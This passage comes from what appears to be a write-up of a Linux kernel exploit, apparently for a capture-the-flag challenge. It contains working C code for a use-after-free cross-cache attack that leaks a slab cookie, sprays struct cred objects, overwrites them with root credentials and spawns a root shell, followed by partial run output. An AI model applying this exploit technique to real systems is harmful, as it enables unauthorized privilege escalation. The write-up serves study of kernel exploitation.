<span class="p">{</span>
    <span class="c1">//[...]</span>
    <span class="cm">/* Reallocate freed kmalloc-96 slab as a pipe page. */</span>
    <span class="kt">uint64_t</span> <span class="n">dummy_buf</span><span class="p">[</span><span class="mh">0x1000</span> <span class="o">/</span> <span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="p">{};</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">ARRAY_SIZE</span><span class="p">(</span><span class="n">pipes</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">write</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">write</span><span class="p">,</span> <span class="n">dummy_buf</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
            <span class="n">fatal</span><span class="p">(</span><span class="s">"write() to pipe failed"</span><span class="p">);</span>

    <span class="cm">/* unblock to trigger memcpy(). */</span>
    <span class="kt">size_t</span> <span class="n">copied_size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">ufd_unblock_page_copy</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">blockers</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">arg</span><span class="p">.</span><span class="n">pagefault</span><span class="p">.</span><span class="n">address</span><span class="p">,</span> <span class="n">scratch</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">copied_size</span><span class="p">);</span>

    <span class="n">usleep</span><span class="p">(</span><span class="mi">200000</span><span class="p">);</span>
    <span class="kt">uint64_t</span> <span class="n">cookie</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">cookie_idx</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">pipe_idx</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">pipe_idx</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">pipe_idx</span> <span class="o">&lt;</span> <span class="n">ARRAY_SIZE</span><span class="p">(</span><span class="n">pipes</span><span class="p">);</span> <span class="n">pipe_idx</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="cm">/* kmalloc-96 is not naturally aligned to PAGESIZE, so we can read this all without worrying
         * about prematurely freeing our page. */</span>
        <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">42</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="kt">uint64_t</span> <span class="n">chunk</span><span class="p">[</span><span class="mh">0x0c</span><span class="p">];</span>

            <span class="k">if</span> <span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="n">pipe_idx</span><span class="p">].</span><span class="n">read</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">chunk</span><span class="p">,</span> <span class="mi">96</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span>
                <span class="n">fatal</span><span class="p">(</span><span class="s">"read() from pipe failed"</span><span class="p">);</span>

            <span class="kt">uint64_t</span> <span class="n">potential_cookie</span> <span class="o">=</span> <span class="n">chunk</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>

            <span class="n">printf</span><span class="p">(</span><span class="s">"%.16lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">potential_cookie</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">cookie</span> <span class="o">&amp;&amp;</span> <span class="n">potential_cookie</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">cookie</span> <span class="o">=</span> <span class="n">potential_cookie</span><span class="p">;</span>
                <span class="n">cookie_idx</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">cookie</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">cookie</span><span class="p">)</span> <span class="p">{</span>

        <span class="cm">/* If we didn't land on a cred boundary, bail out. We'd crash anyway. */</span>
        <span class="k">if</span> <span class="p">((</span><span class="n">cookie_idx</span> <span class="o">*</span> <span class="mi">96</span><span class="p">)</span> <span class="o">%</span> <span class="mi">192</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="cm">/* make the memcpy() just write into our controlled pipe page again, so no harm is done. */</span>
            <span class="n">ufd_unblock_page_copy</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">blockers</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">arg</span><span class="p">.</span><span class="n">pagefault</span><span class="p">.</span><span class="n">address</span><span class="p">,</span> <span class="n">scratch</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">copied_size</span><span class="p">);</span>
            <span class="n">fatal</span><span class="p">(</span><span class="s">"UaF object was not aligned to 192 bytes. Try again.."</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="cm">/* Before releasing the page again, we empty the cred freelist 
         * so any new cred allocations will get a new slab */</span>
        <span class="n">alloc_n_creds</span><span class="p">(</span><span class="n">uring_cred_dumps</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mh">0x4000</span><span class="p">);</span>

        <span class="cm">/* Release page*/</span>
        <span class="n">close</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="n">pipe_idx</span><span class="p">].</span><span class="n">read</span><span class="p">);</span>
        <span class="n">close</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="n">pipe_idx</span><span class="p">].</span><span class="n">write</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="cm">/* this error path is a bit problematic, we don't know where the write went.. 
         * still, it's better to get the other write over with now.
        */</span>
        <span class="n">ufd_unblock_page_copy</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">blockers</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">arg</span><span class="p">.</span><span class="n">pagefault</span><span class="p">.</span><span class="n">address</span><span class="p">,</span> <span class="n">scratch</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">copied_size</span><span class="p">);</span>
        <span class="n">fatal</span><span class="p">(</span><span class="s">"cross-cache failed. Try again.."</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"pipe %ld, offset +0x%.4lx: cookie %.16lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pipe_idx</span><span class="p">,</span> <span class="n">cookie_idx</span> <span class="o">*</span> <span class="mi">96</span><span class="p">,</span> <span class="n">cookie</span><span class="p">);</span>
    <span class="c1">//[...]</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Note that we can also observe the offset of the object inside of the page now by tracking how much we’ve read from the pipe! This is important, because now we can determine whether our UaF buffer is aligned to 192 bytes or not. If this is not the case, we’ll have to exit early, because even reallocating as a struct cred, we’d end up with bad alignment that’d leave us unable to overwrite the juicy cred fields. This is actually fine, because we can just retry the exploit up until this part until we get favorable alignment.</p>

<p>If the offset is favorable, we can now proceed by closing the pipe and thereby releasing the pipe back to the page allocator. Now we can reallocate this page as a <code class="language-plaintext highlighter-rouge">struct cred</code> slab! I found a nice way to spray <code class="language-plaintext highlighter-rouge">struct cred</code>s in a targeted way using the <code class="language-plaintext highlighter-rouge">capset</code> syscall:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">SYSCALL_DEFINE2</span><span class="p">(</span><span class="n">capset</span><span class="p">,</span> <span class="n">cap_user_header_t</span><span class="p">,</span> <span class="n">header</span><span class="p">,</span> <span class="k">const</span> <span class="n">cap_user_data_t</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">struct</span> <span class="n">__user_cap_data_struct</span> <span class="n">kdata</span><span class="p">[</span><span class="n">_KERNEL_CAPABILITY_U32S</span><span class="p">];</span>
	<span class="kt">unsigned</span> <span class="n">i</span><span class="p">,</span> <span class="n">tocopy</span><span class="p">,</span> <span class="n">copybytes</span><span class="p">;</span>
	<span class="n">kernel_cap_t</span> <span class="n">inheritable</span><span class="p">,</span> <span class="n">permitted</span><span class="p">,</span> <span class="n">effective</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">cred</span> <span class="o">*</span><span class="n">new</span><span class="p">;</span>
	<span class="kt">int</span> <span class="n">ret</span><span class="p">;</span>
	<span class="n">pid_t</span> <span class="n">pid</span><span class="p">;</span>

	<span class="n">ret</span> <span class="o">=</span> <span class="n">cap_validate_magic</span><span class="p">(</span><span class="n">header</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">tocopy</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
		<span class="k">return</span> <span class="n">ret</span><span class="p">;</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">get_user</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">header</span><span class="o">-&gt;</span><span class="n">pid</span><span class="p">))</span>
		<span class="k">return</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>

	<span class="cm">/* may only affect current now */</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">pid</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">pid</span> <span class="o">!=</span> <span class="n">task_pid_vnr</span><span class="p">(</span><span class="n">current</span><span class="p">))</span>
		<span class="k">return</span> <span class="o">-</span><span class="n">EPERM</span><span class="p">;</span>

	<span class="n">copybytes</span> <span class="o">=</span> <span class="n">tocopy</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">__user_cap_data_struct</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">copybytes</span> <span class="o">&gt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">kdata</span><span class="p">))</span>
		<span class="k">return</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">copy_from_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">kdata</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">copybytes</span><span class="p">))</span>
		<span class="k">return</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>

	<span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">tocopy</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">effective</span><span class="p">.</span><span class="n">cap</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">kdata</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">effective</span><span class="p">;</span>
		<span class="n">permitted</span><span class="p">.</span><span class="n">cap</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">kdata</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">permitted</span><span class="p">;</span>
		<span class="n">inheritable</span><span class="p">.</span><span class="n">cap</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">kdata</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">inheritable</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">while</span> <span class="p">(</span><span class="n">i</span> <span class="o">&lt;</span> <span class="n">_KERNEL_CAPABILITY_U32S</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">effective</span><span class="p">.</span><span class="n">cap</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		<span class="n">permitted</span><span class="p">.</span><span class="n">cap</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		<span class="n">inheritable</span><span class="p">.</span><span class="n">cap</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		<span class="n">i</span><span class="o">++</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="n">effective</span><span class="p">.</span><span class="n">cap</span><span class="p">[</span><span class="n">CAP_LAST_U32</span><span class="p">]</span> <span class="o">&amp;=</span> <span class="n">CAP_LAST_U32_VALID_MASK</span><span class="p">;</span>
	<span class="n">permitted</span><span class="p">.</span><span class="n">cap</span><span class="p">[</span><span class="n">CAP_LAST_U32</span><span class="p">]</span> <span class="o">&amp;=</span> <span class="n">CAP_LAST_U32_VALID_MASK</span><span class="p">;</span>
	<span class="n">inheritable</span><span class="p">.</span><span class="n">cap</span><span class="p">[</span><span class="n">CAP_LAST_U32</span><span class="p">]</span> <span class="o">&amp;=</span> <span class="n">CAP_LAST_U32_VALID_MASK</span><span class="p">;</span>

	<span class="n">new</span> <span class="o">=</span> <span class="n">prepare_creds</span><span class="p">();</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">new</span><span class="p">)</span>
		<span class="k">return</span> <span class="o">-</span><span class="n">ENOMEM</span><span class="p">;</span>

	<span class="n">ret</span> <span class="o">=</span> <span class="n">security_capset</span><span class="p">(</span><span class="n">new</span><span class="p">,</span> <span class="n">current_cred</span><span class="p">(),</span>
			      <span class="o">&amp;</span><span class="n">effective</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">inheritable</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">permitted</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
		<span class="k">goto</span> <span class="n">error</span><span class="p">;</span>

	<span class="n">audit_log_capset</span><span class="p">(</span><span class="n">new</span><span class="p">,</span> <span class="n">current_cred</span><span class="p">());</span>

	<span class="k">return</span> <span class="n">commit_creds</span><span class="p">(</span><span class="n">new</span><span class="p">);</span>

<span class="nl">error:</span>
	<span class="n">abort_creds</span><span class="p">(</span><span class="n">new</span><span class="p">);</span>
	<span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">new = prepare_creds()</code> will allocate a new <code class="language-plaintext highlighter-rouge">struct cred</code> and <code class="language-plaintext highlighter-rouge">return commit_creds(new)</code> will replace our current task its cred with <code class="language-plaintext highlighter-rouge">new_cred</code>. To prevent the old cred from being freed, we can actually reuse the <code class="language-plaintext highlighter-rouge">io_uring</code> primitive we used for spraying kmalloc-96!</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">int</span> <span class="nf">io_register_personality</span><span class="p">(</span><span class="k">struct</span> <span class="n">io_ring_ctx</span> <span class="o">*</span><span class="n">ctx</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">struct</span> <span class="n">io_identity</span> <span class="o">*</span><span class="n">iod</span><span class="p">;</span>
	<span class="n">u32</span> <span class="n">id</span><span class="p">;</span>
	<span class="kt">int</span> <span class="n">ret</span><span class="p">;</span>

	<span class="n">iod</span> <span class="o">=</span> <span class="n">kmalloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">iod</span><span class="p">),</span> <span class="n">GFP_KERNEL</span><span class="p">);</span> <span class="cm">/* sizeof (*iod) == 72 -&gt; kmalloc-96 */</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="o">!</span><span class="n">iod</span><span class="p">))</span>
		<span class="k">return</span> <span class="o">-</span><span class="n">ENOMEM</span><span class="p">;</span>

	<span class="n">io_init_identity</span><span class="p">(</span><span class="n">iod</span><span class="p">);</span>
	<span class="n">iod</span><span class="o">-&gt;</span><span class="n">creds</span> <span class="o">=</span> <span class="n">get_current_cred</span><span class="p">();</span>

	<span class="n">ret</span> <span class="o">=</span> <span class="n">xa_alloc_cyclic</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ctx</span><span class="o">-&gt;</span><span class="n">personalities</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">id</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">iod</span><span class="p">,</span>
			<span class="n">XA_LIMIT</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">USHRT_MAX</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">ctx</span><span class="o">-&gt;</span><span class="n">pers_next</span><span class="p">,</span> <span class="n">GFP_KERNEL</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">put_cred</span><span class="p">(</span><span class="n">iod</span><span class="o">-&gt;</span><span class="n">creds</span><span class="p">);</span>
		<span class="n">kfree</span><span class="p">(</span><span class="n">iod</span><span class="p">);</span>
		<span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="n">id</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">get_current_cred()</code> will take an extra reference to the current tasks cred and store it in the io_uring context. We can combine this with capset in the following way:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">int</span> <span class="nf">alloc_n_creds</span><span class="p">(</span><span class="kt">int</span> <span class="n">uring_fd</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">n_creds</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">n_creds</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">struct</span> <span class="n">__user_cap_header_struct</span> <span class="n">cap_hdr</span> <span class="o">=</span> <span class="p">{</span>
            <span class="p">.</span><span class="n">pid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
            <span class="p">.</span><span class="n">version</span> <span class="o">=</span> <span class="n">_LINUX_CAPABILITY_VERSION_3</span>
        <span class="p">};</span>

        <span class="k">struct</span> <span class="n">user_cap_data_struct</span> <span class="n">cap_data</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span>
            <span class="p">{.</span><span class="n">effective</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="p">.</span><span class="n">inheritable</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="p">.</span><span class="n">permitted</span> <span class="o">=</span> <span class="mi">0</span><span class="p">},</span>
            <span class="p">{.</span><span class="n">effective</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="p">.</span><span class="n">inheritable</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="p">.</span><span class="n">permitted</span> <span class="o">=</span> <span class="mi">0</span><span class="p">}</span>
        <span class="p">};</span>

        <span class="cm">/* allocate new cred */</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">syscall</span><span class="p">(</span><span class="n">SYS_capset</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cap_hdr</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">cap_data</span><span class="p">))</span>
            <span class="n">fatal</span><span class="p">(</span><span class="s">"capset() failed"</span><span class="p">);</span>

        <span class="cm">/* increment refcount so we don't free it afterwards*/</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">syscall</span><span class="p">(</span><span class="n">SYS_io_uring_register</span><span class="p">,</span> <span class="n">uring_fd</span><span class="p">,</span> <span class="n">IORING_REGISTER_PERSONALITY</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
            <span class="n">fatal</span><span class="p">(</span><span class="s">"io_uring_register() failed"</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Before freeing the pipe page again, you might have already noticed the call to <code class="language-plaintext highlighter-rouge">alloc_n_creds(uring_creds_dump[0], 0x4000)</code>. We do this while the page is still in use to exhaust all the freelists (both cpu partial lists and per slab freelists) for the <code class="language-plaintext highlighter-rouge">struct cred</code> cache. This way, we can be quite certain that new <code class="language-plaintext highlighter-rouge">struct cred</code> allocations will immediately cause a new slab to be allocated from the page allocator directly.</p>

<p>The remaining part of the exploit is short and sweet:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="o">*</span><span class="nf">userfault_thread</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">arg</span><span class="p">)</span>
<span class="p">{</span>
    <span class="c1">//[...]</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"pipe %ld, offset +0x%.4lx: cookie %.16lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pipe_idx</span><span class="p">,</span> <span class="n">cookie_idx</span> <span class="o">*</span> <span class="mi">96</span><span class="p">,</span> <span class="n">cookie</span><span class="p">);</span>

    <span class="cm">/* Pre-allocate struct creds to reclaim the page. 
     * Free them immediately afterwards so we can reallocate them for tasks. */</span>
    <span class="n">alloc_n_creds</span><span class="p">(</span><span class="n">uring_cred_dumps</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">32</span><span class="p">);</span>
    <span class="n">close</span><span class="p">(</span><span class="n">uring_cred_dumps</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>

    <span class="cm">/* wait for rcu to finish so creds are actually freed. */</span>
    <span class="n">usleep</span><span class="p">(</span><span class="mi">200000</span><span class="p">);</span>

    <span class="k">struct</span> <span class="n">pipe_pair</span> <span class="n">child_comm</span><span class="p">;</span>
    <span class="n">pipe</span><span class="p">(</span><span class="n">child_comm</span><span class="p">.</span><span class="n">__raw</span><span class="p">);</span>

    <span class="cm">/* realloc creds, now belong to child tasks */</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">32</span> <span class="o">*</span> <span class="mi">2</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        
        <span class="k">if</span> <span class="p">(</span><span class="n">fork</span><span class="p">())</span>
            <span class="k">continue</span><span class="p">;</span>
        
        <span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
        <span class="n">uid_t</span> <span class="n">uid</span> <span class="o">=</span> <span class="n">getuid</span><span class="p">();</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"uid: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">uid</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">uid</span><span class="p">)</span> <span class="p">{</span>
            <span class="kt">char</span> <span class="n">dummy</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
            <span class="n">write</span><span class="p">(</span><span class="n">child_comm</span><span class="p">.</span><span class="n">write</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dummy</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">dummy</span><span class="p">);</span>
            <span class="n">system</span><span class="p">(</span><span class="s">"sh"</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
        
    <span class="p">}</span>

    <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>

    <span class="k">struct</span> <span class="n">kernel_cred</span> <span class="o">*</span><span class="n">cred</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">scratch</span><span class="p">;</span>

    <span class="n">cred</span><span class="o">-&gt;</span><span class="n">usage</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">cred</span><span class="o">-&gt;</span><span class="n">uid</span> <span class="o">=</span> <span class="n">cred</span><span class="o">-&gt;</span><span class="n">euid</span> <span class="o">=</span> <span class="n">cred</span><span class="o">-&gt;</span><span class="n">fsuid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">cred</span><span class="o">-&gt;</span><span class="n">gid</span> <span class="o">=</span> <span class="n">cred</span><span class="o">-&gt;</span><span class="n">egid</span> <span class="o">=</span> <span class="n">cred</span><span class="o">-&gt;</span><span class="n">fsgid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">cred</span><span class="o">-&gt;</span><span class="n">securebits</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="cm">/* SECUREBITS_DEFAULT */</span>
    <span class="n">cred</span><span class="o">-&gt;</span><span class="n">cap_effective</span> <span class="o">=</span> <span class="n">cred</span><span class="o">-&gt;</span><span class="n">cap_permitted</span> <span class="o">=</span> <span class="n">cred</span><span class="o">-&gt;</span><span class="n">cap_inheritable</span> <span class="o">=</span> <span class="n">cred</span><span class="o">-&gt;</span><span class="n">cap_bset</span> <span class="o">=</span> <span class="mh">0x1fffffffful</span><span class="p">;</span>
    <span class="n">cred</span><span class="o">-&gt;</span><span class="n">cap_ambient</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">96</span> <span class="o">/</span> <span class="mi">8</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
        <span class="n">scratch</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">cookie</span><span class="p">;</span>

    <span class="n">ufd_unblock_page_copy</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">blockers</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">arg</span><span class="p">.</span><span class="n">pagefault</span><span class="p">.</span><span class="n">address</span><span class="p">,</span> <span class="n">scratch</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">copied_size</span><span class="p">);</span>

    <span class="k">struct</span> <span class="n">pollfd</span> <span class="n">poller</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="p">{.</span><span class="n">events</span> <span class="o">=</span> <span class="n">POLLIN</span><span class="p">,</span> <span class="p">.</span><span class="n">fd</span> <span class="o">=</span> <span class="n">child_comm</span><span class="p">.</span><span class="n">read</span><span class="p">}};</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">poll</span><span class="p">(</span><span class="n">poller</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">3000</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span>
        <span class="n">fatal</span><span class="p">(</span><span class="s">"Could not overwrite struct cred. Try again.."</span><span class="p">);</span>

    <span class="n">sleep</span><span class="p">(</span><span class="mi">10000</span><span class="p">);</span>
    <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>We call <code class="language-plaintext highlighter-rouge">alloc_n_creds(uring_cred_dumps[1], 32)</code> to alloc 32 new <code class="language-plaintext highlighter-rouge">struct cred</code>s that will hopefully cause the page to be reallocated as a <code class="language-plaintext highlighter-rouge">struct cred</code> slab. Afterwards, we free all of them, and allocate a bunch of child processes. The cred allocations will be reused for their creds, after which point we can trigger the UaF write again and overwrite the creds to give us root! Each child process can then check their uid via <code class="language-plaintext highlighter-rouge">getuid()</code> and give us a root shell in case it returns <code class="language-plaintext highlighter-rouge">0</code>.</p>

<p>*Note bene: Technically the parent task could also have had its cred overwritten, so I should have checked there as well. */</p>

<p>The exploit completes in a few seconds and is quite reliable (though I could have done a few more optimizations!) The exploit will succeed about 50% of the time due to the alignment problem, but can be reran as it won’t cause a crash.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~ $ ./pwn
[+] rlimit 7 increased to 4096userfaultfd initialized
[+] got userfault block 0 (addr 00007f8a4d7ab000)
[+] got userfault block 1 (addr 00007f8a4d7ac000)
unblocking 0x7f8a4d7ab000 (copying 0x1000 bytes from 0x7f8a4d7a9000)[+] note_edit() succeeded
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
529d1fb9167cb1a3
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
